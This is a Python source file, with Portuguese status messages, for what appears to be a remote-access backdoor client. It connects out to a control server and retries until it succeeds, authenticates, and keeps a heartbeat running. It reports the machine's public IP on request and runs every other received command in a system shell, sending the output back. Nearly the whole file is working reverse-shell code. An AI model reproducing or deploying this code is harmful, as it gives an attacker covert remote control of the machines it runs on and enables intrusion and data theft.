import socket
import subprocess
import requests
import time
from auth import authenticate
from commands import process_command
from heartbeat import start_heartbeat

def start_client(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            print(f"[*] Tentando conectar com: {server_ip}:{server_port}...")
            client.connect((server_ip, server_port))
            print("[+] Conectado!")
            break
        except (ConnectionRefusedError, OSError):
            print("[!] Conexao nao encontrada. Tentando dnv em 5 segundos...")
            time.sleep(5)

    if not authenticate(client):
        return

    start_heartbeat(client)

    while True:
        try:
            command = client.recv(10*1024).decode()
            if not command:
                print("[!] Server desconectado.")
                break

            print(f"[+] Comando: {command}")

            if command.lower() == "exit":
                print("[*] Saindo...")
                break

            if command.lower() == "getip":
                r = requests.get('https://api64.ipify.org?format=json')
                response = r.json()
                output = response['ip']
                client.send(output.encode())
                print(f"[+] IP: {output}")
                continue

            # Processar comandos extras
            if process_command(client, command):
                continue

            # Executar comando shell padrão
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                output = e.output

            client.send(output.encode())
            print(f"[*]{output}")

        except (ConnectionResetError, BrokenPipeError):
            print("[!] Conexao perdida. Saindo...")
            break

    client.close()

if __name__ == "__main__":
    start_client("127.0.0.1", 5555)
